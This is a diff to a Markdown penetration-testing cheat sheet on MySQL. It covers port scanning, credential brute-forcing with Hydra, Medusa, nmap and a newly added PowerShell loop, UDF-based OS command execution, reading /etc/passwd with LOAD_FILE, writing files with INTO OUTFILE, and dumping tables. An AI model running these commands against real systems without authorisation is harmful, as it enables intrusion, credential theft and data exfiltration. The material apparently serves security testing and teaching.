@@ -21,11 +21,17 @@ Exploiting MySQL can lead to:
 * Lateral movement within the network
 * Privilege escalation
 
-## Enumeration
+## Practice
 
-### Port scanning
+### Enumeration
+
+#### Port scanning
 
 MySQL typically runs on port `3306/TCP`, but it can be configured to run on custom ports. MySQL uses only TCP/3306 by default. Some scanners may check UDP/3306, but no standard MySQL service listens on UDP.
+
+::: tabs
+
+=== Unix-like
 
 ```bash
 # Basic port scan
@@ -41,35 +47,81 @@ nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-users,mysql-database
 nmap -sU -p 3306 $TARGET
 ```
 
-### Banner grabbing
+=== Windows
+
+```powershell
+# Basic port scan using Test-NetConnection
+Test-NetConnection -ComputerName $TARGET -Port 3306
+
+# Using nmap (if available)
+nmap -p 3306 -sV $TARGET
+nmap -p 3306 --script mysql-info,mysql-empty-password $TARGET
+```
+
+:::
+
+#### Service detection
+
+MySQL service information can be detected using network scanning tools. The MySQL protocol requires a proper client handshake, making simple banner grabbing unreliable.
+
+::: tabs
+
+=== Unix-like
 
 ```bash
-# Using nc
-nc -vn $TARGET 3306
-
-# Using nmap
+# Service version detection
 nmap -p 3306 -sV $TARGET
 
 # Using mysql client (if available)
 mysql -h $TARGET -P 3306
 ```
 
+=== Windows
+
+```powershell
+# Using nmap (if available)
+nmap -p 3306 -sV $TARGET
+
+# Using mysql client (if available)
+mysql -h $TARGET -P 3306
+```
+
+:::
+
 > [!NOTE]
-> Banner grabbing via `nc` may be unreliable because MySQL expects a client handshake. Sometimes you'll see version information (5.7.x or 8.0.x), but sometimes `nc` shows nothing or closes immediately. Use `nmap` or the MySQL client for more reliable results.
+> Simple banner grabbing via `nc` is unreliable because MySQL expects a client handshake. Service version detection using `nmap` or the MySQL client provides more reliable results.
 
-## Authentication
+### Authentication
 
-### Authentication enumeration
+#### Authentication enumeration
 
 Check if MySQL allows anonymous connections or uses weak authentication.
+
+::: tabs
+
+=== Unix-like
 
 ```bash
 # Check for empty password
 nmap -p 3306 --script mysql-empty-password $TARGET
 
-# Enumerate users
-nmap -p 3306 --script mysql-users --script-args mysqluser=root $TARGET
+# Enumerate users (requires valid credentials with appropriate privileges)
+# Replace $PASSWORD with actual password or use interactive mode
+nmap -p 3306 --script mysql-users --script-args mysqluser=root,mysqlpass=$PASSWORD $TARGET
 ```
+
+=== Windows
+
+```powershell
+# Using nmap (if available)
+nmap -p 3306 --script mysql-empty-password $TARGET
+nmap -p 3306 --script mysql-users --script-args mysqluser=root,mysqlpass=$PASSWORD $TARGET
+```
+
+:::
+
+> [!NOTE]
+> The `mysql-users` NSE script requires valid credentials with appropriate privileges to enumerate users. The enumeration capabilities depend on the authentication method and user permissions.
 
 ### Default credentials
 
@@ -87,63 +139,78 @@ MySQL often uses default credentials, especially in development environments and
 > * Development environments and labs
 > * Negligent administrator configurations
 
-### Bruteforce
+#### Bruteforce
 
 ::: tabs
 
-=== Hydra
+=== Unix-like
 
 ```bash
+# Using Hydra
 hydra -l root -P /path/to/passwords.txt $TARGET mysql
-```
 
-=== Metasploit
-
-```bash
-msfconsole
-use auxiliary/scanner/mysql/mysql_login
-set RHOSTS $TARGET
-set USERNAME root
-set PASS_FILE /path/to/passwords.txt
-run
-```
-
-=== Nmap
-
-```bash
+# Using nmap
 nmap -p 3306 --script mysql-brute --script-args userdb=/path/to/users.txt,passdb=/path/to/passwords.txt $TARGET
+
+# Using Medusa
+medusa -h $TARGET -u root -P /path/to/passwords.txt -M mysql
 ```
 
-=== Medusa
+=== Windows
 
-```bash
-medusa -h $TARGET -u root -P /path/to/passwords.txt -M mysql
+```powershell
+# Using nmap (if available)
+nmap -p 3306 --script mysql-brute --script-args userdb=/path/to/users.txt,passdb=/path/to/passwords.txt $TARGET
+
+# Using mysql client for basic credential testing
+$users = Get-Content users.txt
+$passwords = Get-Content passwords.txt
+foreach ($user in $users) {
+    foreach ($pass in $passwords) {
+        try {
+            mysql -h $TARGET -u $user -p$pass -e "SELECT 1" 2>$null
+            if ($LASTEXITCODE -eq 0) {
+                Write-Host "Valid: $user:$pass"
+            }
+        } catch {
+            # Invalid credentials
+        }
+    }
+}
 ```
 
 :::
 
-## Database enumeration
+### Database enumeration
 
-Once authenticated, enumerate databases, tables, and users.
+Once authenticated, databases, tables, and users can be enumerated.
 
 ::: tabs
 
-=== mysql client
-
-The MySQL command-line client is the standard tool for interacting with MySQL databases.
+=== Unix-like
 
 ```bash
-# Connect
+# Using mysql client
 mysql -h $TARGET -u $USER -p
-
-# Connect with password
 mysql -h $TARGET -u $USER -p$PASSWORD
-
-# Execute single query
 mysql -h $TARGET -u $USER -p$PASSWORD -e "SELECT @@version;"
 ```
 
-Once connected, useful commands:
+=== Windows
+
+```powershell
+# Using mysql client
+mysql -h $TARGET -u $USER -p
+mysql -h $TARGET -u $USER -p$PASSWORD
+mysql -h $TARGET -u $USER -p$PASSWORD -e "SELECT @@version;"
+
+# Using PowerShell with mysql.exe (if available)
+& mysql.exe -h $TARGET -u $USER -p$PASSWORD -e "SELECT @@version;"
+```
+
+:::
+
+Useful SQL commands once connected:
 
 ```sql
 -- Get MySQL version
@@ -170,30 +237,31 @@ SELECT user, host FROM mysql.user;
 SELECT USER();
 SELECT CURRENT_USER();
 
--- Check user privileges
+-- Check user privileges (for current user)
 SHOW GRANTS;
+
+-- Check user privileges for specific user (host may not always be known)
 SHOW GRANTS FOR 'username'@'host';
 ```
 
-:::
+> [!NOTE]
+> When using `SHOW GRANTS FOR 'username'@'host'`, the host component may not always be known. `SHOW GRANTS;` without arguments shows privileges for the current user and is often sufficient.
 
-## Exploitation
+### Exploitation
 
-### Command execution and file operations
+#### Command execution and file operations
 
 MySQL can execute operating system commands through User Defined Functions (UDF) or by reading/writing files.
 
-::: tabs
+##### User Defined Functions (UDF)
 
-=== User Defined Functions (UDF)
-
-UDF allows executing system commands through MySQL functions. This requires `FILE` privilege and the ability to write to the plugin directory (`plugin_dir` must be writable).
+UDF allows executing system commands through MySQL functions. UDF exploitation requires the ability to place a shared library in a loadable directory (often `plugin_dir`) and sufficient privileges to create the function (CREATE FUNCTION, and sometimes SUPER or ALTER depending on MySQL version and configuration).
 
 ```sql
 -- Check if UDF is available
 SELECT * FROM mysql.func;
 
--- Create UDF (requires FILE privilege and plugin directory write access)
+-- Create UDF (requires write access to plugin directory and CREATE FUNCTION privilege)
 -- This is typically done by loading a shared library
 CREATE FUNCTION sys_exec RETURNS string SONAME 'lib_mysqludf_sys.so';
 CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';
@@ -209,15 +277,17 @@ SELECT sys_eval('id');
 > * Cryptographic validation has been introduced
 > * 64-bit libraries are required
 > 
-> UDF exploitation works mainly on MySQL 5.x or poorly secured installations.
+> UDF exploitation works mainly on MySQL 5.x or poorly secured installations. Note that MariaDB environments may differ in their UDF implementation and restrictions.
 
-=== File operations
+##### File operations
 
 MySQL can read and write files if the user has `FILE` privilege.
 
 ```sql
--- Check FILE privilege
+-- Check FILE privilege (host may not always be known)
 SHOW GRANTS FOR 'username'@'host';
+-- Or check current user privileges
+SHOW GRANTS;
 
 -- Read system files
 SELECT LOAD_FILE('/etc/passwd');
@@ -249,11 +319,9 @@ SELECT * FROM users INTO OUTFILE '/tmp/users.csv' FIELDS TERMINATED BY ',' ENCLO
 > * Since MySQL 5.6/5.7, `secure_file_priv` disables `INTO OUTFILE` outside of a dedicated directory. This parameter is often enabled, which prevents web shells via `OUTFILE`.
 > * `LOAD_FILE` requires MySQL to have access to the file path, the file must be readable by the MySQL service OS user, and `secure_file_priv` may restrict read operations.
 
-:::
+#### Data exfiltration
 
-### Data exfiltration
-
-Extract sensitive data from databases.
+Sensitive data can be extracted from databases.
 
 ```sql
 -- List all databases
@@ -269,9 +337,9 @@ SHOW TABLES;
 SELECT * FROM users;
 ```
 
-## Navigation in database
+### Navigation in database
 
-### Useful SQL queries
+#### Useful SQL queries
 
 ```sql
 -- Get MySQL version
@@ -319,8 +387,10 @@ SELECT * FROM table_name WHERE column_name LIKE '%search_term%';
 -- List all users
 SELECT user, host FROM mysql.user;
 
--- List user privileges
+-- List user privileges (for current user)
 SHOW GRANTS;
+
+-- List user privileges for specific user (host may not always be known)
 SHOW GRANTS FOR 'username'@'host';
 
 -- Check user privileges (note: this query does not reflect all active privileges, especially since MySQL 8.0)
@@ -374,4 +444,14 @@ WHERE TABLE_SCHEMA = 'database_name';
 
 ## Resources
 
-[https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)
+### References
+
+- [MySQL Reference Manual — FILE Privilege](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_file)
+- [MySQL Reference Manual — secure_file_priv System Variable](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_secure_file_priv)
+- [MySQL Reference Manual — SELECT ... INTO Statement](https://dev.mysql.com/doc/refman/8.0/en/select-into.html)
+- [MySQL Reference Manual — LOAD_FILE() Function](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file)
+- [HackTricks — Pentesting MySQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)
+
+### Tools
+
+- [MySQL Command-Line Client](https://dev.mysql.com/doc/refman/8.0/en/mysql.html)
